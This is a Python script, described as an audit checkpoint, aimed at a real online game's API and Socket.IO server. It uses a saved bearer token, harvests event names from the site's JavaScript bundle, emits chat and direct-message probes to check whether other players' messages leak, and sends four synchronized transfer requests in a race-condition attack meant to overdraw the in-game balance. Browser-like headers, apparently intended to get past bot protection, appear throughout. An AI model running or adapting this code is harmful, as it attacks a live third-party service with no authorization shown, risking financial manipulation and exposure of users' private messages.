#!/usr/bin/env python3
"""Checkpoint 6: Socket.IO event enum + transfer race (audit)."""
from __future__ import annotations

import json
import re
import sys
import threading
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / "output" / "reverse"
AUTH = Path("/root/diplomacia-auth.json")
BUNDLE = Path("/tmp/diplomacia-index.js")
BASE = "https://diplomacia.com.tr/api"
SOCKET_URL = "https://diplomacia.com.tr"
DELAY = 3.0
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"


def load_auth() -> tuple[str, str]:
    a = json.loads(AUTH.read_text())
    return a["token"], a["player_id"]


def api(method: str, path: str, token: str, body: dict | None = None) -> dict:
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/json",
        "User-Agent": UA,
        "Origin": "https://diplomacia.com.tr",
        "Referer": "https://diplomacia.com.tr/",
    }
    data = None
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    time.sleep(DELAY)
    req = urllib.request.Request(BASE + path, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            raw = r.read().decode()
            return {"status": r.status, "data": json.loads(raw) if raw.startswith("{") else raw[:400]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try:
            data = json.loads(raw)
        except Exception:
            data = raw[:400]
        return {"status": e.code, "data": data, "cf": "1010" in raw}


def extract_socket_events() -> list[str]:
    if not BUNDLE.exists():
        return []
    js = BUNDLE.read_text(encoding="utf-8", errors="ignore")
    found: set[str] = set()
    for pat in (
        r'\.on\(["\']([a-zA-Z0-9_]+)["\']',
        r'emit\(["\']([a-zA-Z0-9_]+)["\']',
        r'sio\.on\(["\']([a-zA-Z0-9_]+)["\']',
    ):
        found.update(re.findall(pat, js))
    # chat/socket domain filter
    skip = {"connect", "disconnect", "connect_error", "error", "reconnect"}
    chatish = sorted(
        e for e in found
        if e not in skip and not e.startswith("Native") and len(e) > 2
    )
    return chatish


def probe_socket(token: str) -> dict:
    result: dict = {
        "connected": False,
        "events_heard": [],
        "emits_tried": [],
        "errors": [],
        "bundle_events": extract_socket_events(),
    }
    try:
        import socketio
    except ImportError:
        result["errors"].append("python-socketio not installed")
        return result

    log: list[dict] = []
    sio = socketio.Client(logger=False, engineio_logger=False)

    @sio.event
    def connect():
        result["connected"] = True
        log.append({"type": "connect"})

    @sio.event
    def connect_error(data):
        result["errors"].append(f"connect_error: {data}")

    for ev in result["bundle_events"][:25]:
        def _handler(data, event=ev):
            log.append({"event": event, "data": str(data)[:400]})

        try:
            sio.on(ev)(_handler)
        except Exception:
            pass

    try:
        sio.connect(
            SOCKET_URL,
            auth={"token": token, "lang": "tr"},
            transports=["polling", "websocket"],
            wait_timeout=20,
        )
        time.sleep(2)
        probes = [
            ("global_message", {"message": "audit-cp6", "lang": "tr"}),
            ("join_global", {}),
            ("dm_send", {"recipient_id": "00000000-0000-0000-0000-000000000099", "message": "audit"}),
            ("conf_send", {"conference_id": "00000000-0000-0000-0000-000000000001", "message": "audit"}),
        ]
        for ev, payload in probes:
            try:
                sio.emit(ev, payload)
                result["emits_tried"].append({"event": ev, "payload": payload})
            except Exception as ex:
                result["emits_tried"].append({"event": ev, "error": str(ex)})
            time.sleep(0.5)
        time.sleep(3)
        sio.disconnect()
    except Exception as ex:
        result["errors"].append(str(ex))

    result["events_heard"] = log
    result["foreign_dm_received"] = any(
        e.get("event") == "dm_message" and "audit" not in str(e.get("data", ""))
        for e in log
    )
    return result


def probe_transfer_gate(token: str, my_id: str) -> dict:
    prof = api("GET", "/players/profile", token)
    player = prof["data"].get("player", {})
    level = player.get("level", 0)
    bal_before = int(player.get("balance") or 0)

    fake = "00000000-0000-0000-0000-000000000099"
    single = api("POST", "/transfer/send", token, {"recipient_id": fake, "amount": 100})

    race_outcomes: list[dict] = []
    if level >= 5:
        barrier = threading.Barrier(4)

        def send_once(i: int):
            try:
                barrier.wait(timeout=8)
                headers = {
                    "Authorization": f"Bearer {token}",
                    "Content-Type": "application/json",
                    "User-Agent": UA,
                    "Origin": "https://diplomacia.com.tr",
                }
                body = json.dumps({"recipient_id": fake, "amount": 100}).encode()
                req = urllib.request.Request(
                    BASE + "/transfer/send", data=body, headers=headers, method="POST"
                )
                with urllib.request.urlopen(req, timeout=20) as r:
                    race_outcomes.append({"thread": i, "status": r.status})
            except urllib.error.HTTPError as e:
                race_outcomes.append({"thread": i, "status": e.code, "body": e.read().decode()[:120]})
            except Exception as ex:
                race_outcomes.append({"thread": i, "error": str(ex)})

        threads = [threading.Thread(target=send_once, args=(i,)) for i in range(4)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        time.sleep(DELAY)

    prof2 = api("GET", "/players/profile", token)
    bal_after = int(prof2["data"].get("player", {}).get("balance") or 0)

    return {
        "level": level,
        "transfer_min_level": 5,
        "level_gate_active": level < 5,
        "single_transfer": {"status": single["status"], "response": str(single["data"])[:200]},
        "balance_before": bal_before,
        "balance_after": bal_after,
        "balance_delta": bal_after - bal_before,
        "race_skipped": level < 5,
        "race_outcomes": race_outcomes,
        "race_exploit": (bal_before - bal_after) > 100 and level >= 5,
    }


def main() -> int:
    OUT.mkdir(parents=True, exist_ok=True)
    if not AUTH.exists():
        print("AUTH missing", file=sys.stderr)
        return 1

    token, my_id = load_auth()
    report = {
        "ts": datetime.now(timezone.utc).isoformat(),
        "checkpoint": 6,
        "socket": probe_socket(token),
        "transfer": probe_transfer_gate(token, my_id),
    }

    events_path = OUT / "socket_events_enum.json"
    events_path.write_text(
        json.dumps(
            {"events": report["socket"]["bundle_events"], "count": len(report["socket"]["bundle_events"])},
            ensure_ascii=False,
            indent=2,
        ),
        encoding="utf-8",
    )

    out_path = OUT / "socket_transfer_checkpoint6.json"
    out_path.write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")

    print(f"socket connected={report['socket']['connected']}")
    print(f"bundle events={len(report['socket']['bundle_events'])}")
    print(f"foreign_dm={report['socket'].get('foreign_dm_received')}")
    print(f"transfer level={report['transfer']['level']} race_skipped={report['transfer']['race_skipped']}")
    print(f"balance_delta={report['transfer']['balance_delta']}")
    print(f"saved {out_path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
